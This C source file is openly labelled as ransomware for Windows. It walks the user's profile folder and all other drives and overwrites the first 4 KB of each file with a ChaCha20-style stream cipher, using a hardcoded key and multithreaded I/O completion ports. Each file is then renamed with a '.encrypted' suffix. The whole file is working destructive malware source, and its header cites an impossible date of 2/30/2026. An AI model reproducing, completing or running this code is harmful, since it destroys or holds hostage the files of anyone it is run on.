//Made by Youssef Khaled (jo), also known as Hevo_Qmpo
//A ransomware program designed in native C to be as fast as possible This project was created on 2/23/2026 and a roadmap will be added to it on 2/30/2026.
//Warning____This project may contain some bugs which will be fixed as soon as possible.

#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x0601
#endif

#ifndef UNICODE
#define UNICODE
#endif

#ifndef _UNICODE
#define _UNICODE
#endif

#include <windows.h>
#include <stdint.h>

typedef struct {
    wchar_t UserProfilePath[MAX_PATH];
    wchar_t OtherDrives[10][4];
    int OtherDrivesCount;
} SYSTEM_SCOUT;

void MyZeroMemory(void* ptr, int size) {
    unsigned char* p = (unsigned char*)ptr;
    while (size--) *p++ = 0;
}

void GetSystemScout(SYSTEM_SCOUT* scout) {
    if (!scout) return;
    MyZeroMemory(scout, sizeof(SYSTEM_SCOUT));
    wchar_t winDir[MAX_PATH];
    wchar_t userName[256];
    wchar_t driveStrings[256];
    DWORD userLen = 256;
    GetWindowsDirectoryW(winDir, MAX_PATH);
    wchar_t winDrive = winDir[0];
    if (GetUserNameW(userName, &userLen)) {
        scout->UserProfilePath[0] = winDrive;
        scout->UserProfilePath[1] = L':';
        scout->UserProfilePath[2] = L'\\';
        scout->UserProfilePath[3] = L'\0';
        lstrcatW(scout->UserProfilePath, L"Users\\");
        lstrcatW(scout->UserProfilePath, userName);
        lstrcatW(scout->UserProfilePath, L"\\");
    }
    if (GetLogicalDriveStringsW(256, driveStrings)) {
        wchar_t* currentDrive = driveStrings;
        while (*currentDrive && scout->OtherDrivesCount < 10) {
            if (currentDrive[0] != winDrive) {
                lstrcpyW(scout->OtherDrives[scout->OtherDrivesCount], currentDrive);
                scout->OtherDrivesCount++;
            }
            currentDrive += lstrlenW(currentDrive) + 1;
        }
    }
}

int lstrlenW_custom(const wchar_t* s) {
    int i = 0;
    while (s[i]) i++;
    return i;
}

void lstrcpyW_custom(wchar_t* dest, const wchar_t* src) {
    while ((*dest++ = *src++));
}

typedef struct {
    OVERLAPPED overlapped;
    HANDLE fileHandle;
    wchar_t* filePath;
    BYTE buffer[4096];
    int isWriting;
} IO_CONTEXT;

wchar_t** driveFiles = NULL;
int fileCount = 0;
int maxFiles = 1024;
uint32_t key[4] = { 0xDEADBEEF, 0xCAFEBABE, 0xFACEFEED, 0x13371337 };

#define ROTL(a,b) (((a) << (b)) | ((a) >> (32 - (b))))
#define QR(a, b, c, d) ( \
    a += b, d ^= a, d = ROTL(d, 16), \
    c += d, b ^= c, b = ROTL(b, 12), \
    a += b, d ^= a, d = ROTL(d, 8), \
    c += d, b ^= c, b = ROTL(b, 7))

void chacha20_block(uint32_t out[16], uint32_t const in[16]) {
    uint32_t x[16];
    for (int i = 0; i < 16; i++) x[i] = in[i];
    for (int i = 0; i < 10; i++) {
        QR(x[0], x[4], x[8], x[12]); QR(x[1], x[5], x[9], x[13]);
        QR(x[2], x[6], x[10], x[14]); QR(x[3], x[7], x[11], x[15]);
        QR(x[0], x[5], x[10], x[15]); QR(x[1], x[6], x[11], x[12]);
        QR(x[2], x[7], x[8], x[13]);  QR(x[3], x[4], x[9], x[14]);
    }
    for (int i = 0; i < 16; i++) out[i] = x[i] + in[i];
}

void encrypt_buffer(uint8_t* buffer, size_t buffer_size) {
    uint32_t state[16] = {
        0x61707865, 0x3320646e, 0x79622d32, 0x6b206574,
        key[0], key[1], key[2], key[3],
        key[0], key[1], key[2], key[3],
        0, 0, 0xDEADBEEF, 0xCAFEBABE
    };
    uint32_t output[16];
    for (size_t i = 0; i < buffer_size; i += 64) {
        chacha20_block(output, state);
        state[12]++;
        uint32_t* buf_ptr = (uint32_t*)(buffer + i);
        for (int j = 0; j < 16 && (i + j * 4) < buffer_size; j++) {
            buf_ptr[j] ^= output[j];
        }
    }
}

DWORD WINAPI WorkerThread(LPVOID lpParam) {
    HANDLE iocp = (HANDLE)lpParam;
    DWORD bytes;
    ULONG_PTR k;
    LPOVERLAPPED ov;
    while (GetQueuedCompletionStatus(iocp, &bytes, &k, &ov, INFINITE)) {
        if (ov == NULL) break;
        IO_CONTEXT* ctx = (IO_CONTEXT*)ov;
        if (!ctx->isWriting && bytes > 0) {
            encrypt_buffer(ctx->buffer, bytes);
            ctx->isWriting = 1;
            ctx->overlapped.Offset = 0; ctx->overlapped.OffsetHigh = 0;
            WriteFile(ctx->fileHandle, ctx->buffer, bytes, NULL, &ctx->overlapped);
        } else {
            CloseHandle(ctx->fileHandle);
            if (ctx->filePath) {
                wchar_t newName[MAX_PATH + 10];
                lstrcpyW_custom(newName, ctx->filePath);
                lstrcpyW_custom(newName + lstrlenW_custom(newName), L".encrypted");
                MoveFileW(ctx->filePath, newName);
                HeapFree(GetProcessHeap(), 0, ctx->filePath);
            }
            HeapFree(GetProcessHeap(), 0, ctx);
        }
    }
    return 0;
}

void Deep_Scout_Manager(const wchar_t* rootPath) {
    wchar_t searchPath[MAX_PATH];
    WIN32_FIND_DATAW fd;
    int len = lstrlenW_custom(rootPath);
    lstrcpyW_custom(searchPath, rootPath);
    if (len > 0 && searchPath[len - 1] != L'\\') {
        searchPath[len] = L'\\';
        searchPath[len + 1] = L'*';
        searchPath[len + 2] = L'\0';
    } else {
        searchPath[len] = L'*';
        searchPath[len + 1] = L'\0';
    }
    HANDLE hFind = FindFirstFileW(searchPath, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;
    do {
        if (fd.cFileName[0] == L'.') continue;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_HIDDEN) continue;
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) continue;
        wchar_t fullPath[MAX_PATH];
        lstrcpyW_custom(fullPath, rootPath);
        int currentLen = lstrlenW_custom(fullPath);
        if (currentLen > 0 && fullPath[currentLen - 1] != L'\\') {
            fullPath[currentLen] = L'\\';
            fullPath[currentLen + 1] = L'\0';
        }
        lstrcatW(fullPath, fd.cFileName);
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT)) {
                Deep_Scout_Manager(fullPath);
            }
        } else {
            if (fileCount >= maxFiles) {
                maxFiles *= 2;
                driveFiles = (wchar_t**)HeapReAlloc(GetProcessHeap(), 0, driveFiles, maxFiles * sizeof(wchar_t*));
            }
            int fLen = lstrlenW_custom(fullPath);
            wchar_t* savedPath = (wchar_t*)HeapAlloc(GetProcessHeap(), 0, (fLen + 1) * sizeof(wchar_t));
            lstrcpyW_custom(savedPath, fullPath);
            driveFiles[fileCount++] = savedPath;
        }
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);
}

void EntryPoint() {
    SYSTEM_SCOUT myData;
    GetSystemScout(&myData);
    driveFiles = (wchar_t**)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, maxFiles * sizeof(wchar_t*));
    Deep_Scout_Manager(myData.UserProfilePath);
    for (int i = 0; i < myData.OtherDrivesCount; i++) {
        Deep_Scout_Manager(myData.OtherDrives[i]);
    }
    if (fileCount > 0) {
        SYSTEM_INFO si; GetSystemInfo(&si);
        int tCount = si.dwNumberOfProcessors * 2;
        HANDLE iocp = CreateIoCompletionPort(INVALID_HANDLE_VALUE, NULL, 0, tCount);
        HANDLE* threads = (HANDLE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(HANDLE) * tCount);
        for (int i = 0; i < tCount; i++) threads[i] = CreateThread(NULL, 0, WorkerThread, iocp, 0, NULL);
        for (int i = 0; i < fileCount; i++) {
            HANDLE hf = CreateFileW(driveFiles[i], GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL);
            if (hf != INVALID_HANDLE_VALUE) {
                CreateIoCompletionPort(hf, iocp, (ULONG_PTR)hf, 0);
                IO_CONTEXT* ctx = (IO_CONTEXT*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(IO_CONTEXT));
                ctx->fileHandle = hf; 
                ctx->isWriting = 0;
                ctx->filePath = driveFiles[i];
                ReadFile(hf, ctx->buffer, 4096, NULL, &ctx->overlapped);
            }
        }
        for (int i = 0; i < tCount; i++) PostQueuedCompletionStatus(iocp, 0, 0, NULL);
        WaitForMultipleObjects(tCount, threads, TRUE, INFINITE);
    }
    ExitProcess(0);
}